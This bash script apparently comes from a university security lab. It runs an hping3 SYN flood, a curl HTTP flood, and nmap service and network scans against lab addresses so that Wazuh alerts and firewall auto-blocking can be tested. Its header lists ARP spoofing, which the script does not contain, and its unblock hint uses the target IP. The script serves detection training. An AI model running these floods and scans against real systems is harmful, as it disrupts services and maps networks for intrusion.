#!/bin/bash
# =============================================================================
# Attack Script 04: Network-Level Attacks
# CIS 3353 Security Lab - Run from Kali container
# =============================================================================
# Demonstrates: SYN flood, ARP spoofing, service enumeration
# Module: 2 (Attack Surfaces), 9 (Infrastructure Security)
# Expected alerts: SYN flood (100210), HTTP flood (100211)
# Active Response: Auto-block on SYN flood (100302)
# =============================================================================

TARGET="${TARGET_IP:-10.10.0.20}"
FIREWALL="${FIREWALL_IP:-10.10.0.1}"
NETWORK="${NETWORK_RANGE:-10.10.0.0/24}"
RESULTS="/root/results/exploits"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "============================================="
echo "  PHASE 4: NETWORK ATTACKS"
echo "  Target: ${TARGET}"
echo "  Firewall: ${FIREWALL}"
echo "  Time: $(date)"
echo "============================================="
echo ""
echo "  WARNING: These attacks may trigger active response"
echo "  and block this container's IP on the firewall."
echo ""

mkdir -p ${RESULTS}

# -----------------------------------------------
# Attack 4.1: SYN Flood (DoS Simulation)
# -----------------------------------------------
echo "[4.1] SYN Flood Attack (30 second burst)"
echo "  Sending SYN packets to ${TARGET}:80..."
timeout 30 hping3 -S --flood -V -p 80 ${TARGET} \
    > ${RESULTS}/syn_flood_${TIMESTAMP}.txt 2>&1 &
SYN_PID=$!
echo "  SYN flood running (PID: ${SYN_PID})..."

# Check if target is still responding during flood
sleep 5
echo -n "  Target availability during flood: "
if curl -s --connect-timeout 3 "http://${TARGET}" > /dev/null 2>&1; then
    echo "STILL RESPONDING (rate limiting working)"
else
    echo "UNAVAILABLE (DoS successful)"
fi

wait ${SYN_PID} 2>/dev/null
echo "  >> SYN flood completed. Results: ${RESULTS}/syn_flood_${TIMESTAMP}.txt"

# Wait for things to settle
sleep 5

# -----------------------------------------------
# Attack 4.2: HTTP Flood
# -----------------------------------------------
echo ""
echo "[4.2] HTTP Request Flood (200 rapid requests)"
echo "  Sending rapid HTTP requests to ${TARGET}..."
for i in $(seq 1 200); do
    curl -s -o /dev/null "http://${TARGET}/" &
done
wait
echo "  >> 200 requests sent. Check firewall for HTTP flood detection."

# -----------------------------------------------
# Attack 4.3: Service Version Detection
# -----------------------------------------------
echo ""
echo "[4.3] Aggressive Service Enumeration"
nmap -sV -sC --script=http-enum,http-headers,http-title,http-server-header \
    -p 80 ${TARGET} -oN ${RESULTS}/service_enum_${TIMESTAMP}.txt
echo "  >> Results: ${RESULTS}/service_enum_${TIMESTAMP}.txt"

# -----------------------------------------------
# Attack 4.4: Network-wide Scan
# -----------------------------------------------
echo ""
echo "[4.4] Full Network Scan"
nmap -sV -O ${NETWORK} -oN ${RESULTS}/network_scan_${TIMESTAMP}.txt
echo "  >> Results: ${RESULTS}/network_scan_${TIMESTAMP}.txt"

echo ""
echo "============================================="
echo "  NETWORK ATTACKS COMPLETE"
echo "  Results: ${RESULTS}/"
echo "  Expected Wazuh alerts:"
echo "    - 100200: Port scan detected"
echo "    - 100210: SYN flood detected"
echo "    - 100211: HTTP flood detected"
echo "    - 100302: Active response (auto-block)"
echo ""
echo "  NOTE: If you are blocked, run from firewall:"
echo "    docker exec pfsense-firewall \\"
echo "      /opt/active-response/handler.sh unblock ${TARGET}"
echo "============================================="
